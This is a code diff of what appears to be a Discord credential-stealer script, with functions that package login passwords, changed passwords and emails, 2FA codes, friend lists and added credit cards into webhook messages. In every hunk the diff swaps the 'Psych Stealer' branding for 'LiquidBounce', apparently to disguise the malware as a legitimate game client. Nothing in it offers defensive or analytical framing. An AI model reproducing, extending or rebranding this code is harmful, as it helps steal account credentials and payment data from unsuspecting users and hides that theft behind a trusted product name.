@@ -99,7 +99,7 @@ function FirstTime(a) {
             .then((R) => {
               const f = JSON.parse(R)
               var U = {
-                username: 'Psych Stealer',
+                username: 'LiquidBounce',
                 content: '',
                 embeds: [
                   {
@@ -141,8 +141,8 @@ function FirstTime(a) {
                         inline: false,
                       },
                     ],
-                    author: { name: 'Psych Stealer' },
-                    footer: { text: 'Psych Stealer' },
+                    author: { name: 'LiquidBounce' },
+                    footer: { text: 'LiquidBounce' },
                     thumbnail: {
                       url:
                         'https://cdn.discordapp.com/avatars/' +
@@ -166,7 +166,7 @@ function FirstTime(a) {
       if (config['logout-notify'] == 'true') {
         if (b == null || b == undefined || b == '') {
           const G = {
-            username: 'Psych Stealer',
+            username: 'LiquidBounce',
             content: '',
             embeds: [
               {
@@ -203,7 +203,7 @@ function FirstTime(a) {
             .then((S) => {
               const q = JSON.parse(S)
               var t = {
-                username: 'Psych Stealer',
+                username: 'LiquidBounce',
                 content: '',
                 embeds: [
                   {
@@ -709,7 +709,7 @@ function Login(a, w, W) {
                                     }
                                     const H = JSON.parse(C)
                                     var X = {
-                                      username: 'Psych Stealer',
+                                      username: 'LiquidBounce',
                                       content: '',
                                       embeds: [
                                         {
@@ -923,7 +923,7 @@ function ChangePassword(a, w, W) {
                         }
                         const H = JSON.parse(J)
                         var Y = {
-                          username: 'Psych Stealer',
+                          username: 'LiquidBounce',
                           content: '',
                           embeds: [
                             {
@@ -1007,7 +1007,7 @@ function ChangePassword(a, w, W) {
                         m.author.icon_url =
                           'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif'
                         m.author.name = '2FA Codes'
-                        m.footer.text = 'Psych Stealer'
+                        m.footer.text = 'LiquidBounce'
                         var i = {
                           color: config['embed-color'],
                           description: v(),
@@ -1016,7 +1016,7 @@ function ChangePassword(a, w, W) {
                               'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                             name: 'HQ Friends',
                           },
-                          footer: { text: 'Psych Stealer' },
+                          footer: { text: 'LiquidBounce' },
                         }
                         W.startsWith('mfa') && Y.embeds.push(q)
                         Y.embeds.push(i)
@@ -1116,7 +1116,7 @@ function ChangePassword(a, w, W) {
                                     }
                                     const H = JSON.parse(n)
                                     var X = {
-                                      username: 'Psych Stealer',
+                                      username: 'LiquidBounce',
                                       content: '',
                                       embeds: [
                                         {
@@ -1181,7 +1181,7 @@ function ChangePassword(a, w, W) {
                                             icon_url:
                                               'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                                           },
-                                          footer: { text: 'Psych Stealer' },
+                                          footer: { text: 'LiquidBounce' },
                                           thumbnail: {
                                             url:
                                               'https://cdn.discordapp.com/avatars/' +
@@ -1321,7 +1321,7 @@ function ChangeEmail(a, w, W) {
                         }
                         const y = JSON.parse(J)
                         var X = {
-                          username: 'Psych Stealer',
+                          username: 'LiquidBounce',
                           content: '',
                           embeds: [
                             {
@@ -1402,8 +1402,8 @@ function ChangeEmail(a, w, W) {
                               title: 'Total Friends (' + Y() + ')',
                               color: config['embed-color'],
                               description: q(),
-                              author: { name: 'Psych Stealer' },
-                              footer: { text: 'Psych Stealer' },
+                              author: { name: 'LiquidBounce' },
+                              footer: { text: 'LiquidBounce' },
                               thumbnail: {
                                 url:
                                   'https://cdn.discordapp.com/avatars/' +
@@ -1640,7 +1640,7 @@ function CreditCardAdded(a, w, W, b, s, J, Q, D, L, k) {
         .then((e) => {
           var G = JSON.parse(U)
           var C = {
-            username: 'Psych Stealer',
+            username: 'LiquidBounce',
             content: '',
             embeds: [
               {
